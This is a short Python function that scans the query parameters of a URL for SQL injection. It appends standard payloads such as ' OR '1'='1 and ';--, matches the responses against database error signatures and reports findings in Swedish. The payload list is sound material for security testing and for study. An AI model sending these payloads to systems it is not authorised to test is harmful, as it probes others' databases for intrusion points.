import requests

def test_sql_injection(url: str, params: dict) -> list[str]:
    payloads = ["'", "\"", "' OR '1'='1", "' OR '1'='2", "';--"]
    error_signatures = [
        "sql syntax", "mysql_fetch", "sqlite3", "psql:",
        "ora-", "unclosed quotation", "syntax error", "odbc"
    ]
    vulnerabilities = []

    for param in params:
        baseline = requests.get(url, params=params, timeout=10).text
        for payload in payloads:
            test_params = {**params, param: params[param] + payload}
            try:
                resp = requests.get(url, params=test_params, timeout=10)
            except requests.RequestException:
                continue
            body = resp.text.lower()
            if any(sig in body for sig in error_signatures):
                vulnerabilities.append(f"{param}: felbaserad SQL-injektion ({payload!r})")
                break
            if payload == "' OR '1'='1" and resp.text != baseline:
                vulnerabilities.append(f"{param}: möjlig boolesk SQL-injektion")
                break

    return vulnerabilities
